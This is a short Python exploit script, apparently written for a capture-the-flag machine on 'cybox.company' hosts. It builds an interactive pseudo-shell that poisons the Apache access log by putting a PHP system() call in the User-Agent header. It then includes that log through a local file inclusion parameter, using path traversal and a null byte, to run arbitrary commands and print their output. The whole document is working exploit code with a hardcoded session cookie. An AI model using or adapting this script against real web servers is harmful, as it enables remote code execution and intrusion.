from cmd import Cmd
import requests

url_ftp = 'http://ftp.cybox.company'
url_lfi = 'http://monitor.cybox.company/admin/styles.php?style='
lfi_access_log = '../../../../../../opt/bitnami/apache2/logs/access_log%00'
cookies = {
  'PHPSESSID': 'gn3ehmq3ak1spci8g6dce7b2m5'
}

class Term(Cmd):
  prompt = "daemon$ "

  def __init__(self):
    super().__init__()

  def default(self, args):
    cmd = args
    headers = {
        'User-Agent': f"<?php system('{cmd}'); ?>"
    }
    _ = requests.get(url_ftp, headers= headers)
    response = requests.get(f"{url_lfi}{lfi_access_log}", cookies= cookies)
    if response.status_code == 200:
      output = response.text.split('"GET / HTTP/1.1" 200 5295 "-" "')[-1]
      print(output)
    else:
      print(response.content)

if __name__ == "__main__":
  term = Term()
  term.cmdloop()
